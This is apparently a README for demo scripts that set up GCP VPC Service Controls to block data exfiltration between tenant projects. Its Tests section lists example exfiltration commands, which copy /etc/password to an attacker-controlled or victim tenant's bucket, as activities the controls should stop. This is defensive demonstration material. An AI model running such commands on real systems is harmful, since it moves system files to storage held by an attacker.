# VPC Service Controls demo scripts

VPC Service Controls are an excellent tool to prevent data exfiltration and other attack chains.
This repo supports the blog describing this at ___.

In a nutshell, data exfiltration is easy via GCP Storage Buckets despite best parctices to lock down networking with aggressive network egress policy. 
In order for cloud resources like VMs or Functions to access GCP Storage (other services like Cloud SQL or BigQuery also apply) the network proxy
must whitelist GCPs public dns names for the given services. This means an attacker can create a GCP Storage Bucket and exfiltrate to their own Bucket.
VPC Service Controls solve exactly this problem.

## Requirements

The role running the scripts must have the following permissions:

*    roles/accesscontextmanager.policyAdmin
*    roles/resourcemanager.organizationViewer
*    roles/dns.admin
*    roles/compute.network.*
*    roles/billing.projectManager on the organization
*    roles/billing.user on the billing account

You must have a GCP Organization. Free accounts come with Projects only.
If you do not have one, create one according to [Creating and Managing Organizations](https://cloud.google.com/resource-manager/docs/creating-managing-organization).
We recommend the `G-Suite` path as it worked more smoothly than the `Cloud Identity`.

Beware that many services are currently incompatible with VPC Service Controls!
If your project uses these [listed services](https://cloud.google.com/vpc-service-controls/docs/supported-products) you
are in luck. Otherwise you may need to check back later, use separate projects for unsupported services or create access-levels.

## Tests
Let's start with what we are trying to prove. Our scripts support a multi-tenant scenario where a tenant can write to buckets in their own project and
a specific bucket in a project shared amongst all tenants.

The following approved bucket activities should succeed assuming we have ssh'd into a vm.
* Create a bucket in the tenant project
* Upload data to the tenant bucket
* Upload data to the tenant's bucket in the shared project
```
vm-in-tenant1-project> gsutil mb gs://tenant1-project-bucket
vm-in-tenant1-project> gsutil cp localfile.txt gs://tenant1-project-bucket
vm-in-tenant1-project> gsutil cp localfile.txt gs://tenant1-shared-project-bucket --project $SHARED_PROJECT_ID --region $REGION
```

The following malicious exfiltration and tampering activities should fail
* Upload malicious data to another tenant's bucket in the shared project
* Exfiltrate data to a victim tenant bucket in the shared project
```
vm-in-tenant1-project> gsutil cp /etc/password gs://attacker-controlled-project-bucket
vm-in-tenant1-project> gsutil cp /etc/password gs://tenat2-shared-project-bucket
```

## Quickstart

```
git clone https://github.com/praetorian-code/vpc-service-controls.git
cd vpc-service-controls
cp .env-sample .env
./create_service_control_project.sh
```

Modify `.env` as needed. It will be ignored by git.

## Troubleshooting

Uncomment the `set -x` line at the top.
This script is not entirely idempotent so you may need to comment out lines on second runs or reset the $RAND, $FOLDER_RAND and $SHARED_RAND variables.
The most likely culprit for problems is not having the correct permissions. Find the line that fails and on the commandline run the following:

```
source .env
<paste and run the failing command>
```

## A more complete multi-tenant script.
The script `create_service_control_project.sh` demonstrates the VPC Service Controls for educational purposes.
A more complete version with some basic security services like configured Logging and Alerts for the malicious activity
is available in `create_service_control_project_full.sh` (coming soon).


# Design

Why bash scripts? We thought it is most instructive to run commands in an interactive way by pasting individual `gcloud` commands.

Ansible was considered, but it doesn't have support for many of the project/organization commands so it would be a lot of shell commands.

We hope to add Terraform modules, Deployment Manager templates and an Ansible playbooks for running the tests in time.  Contributions welcome!

## Terraform

# https://www.terraform.io/docs/providers/google/r/dns_managed_zone.html
# roles/dns.admin

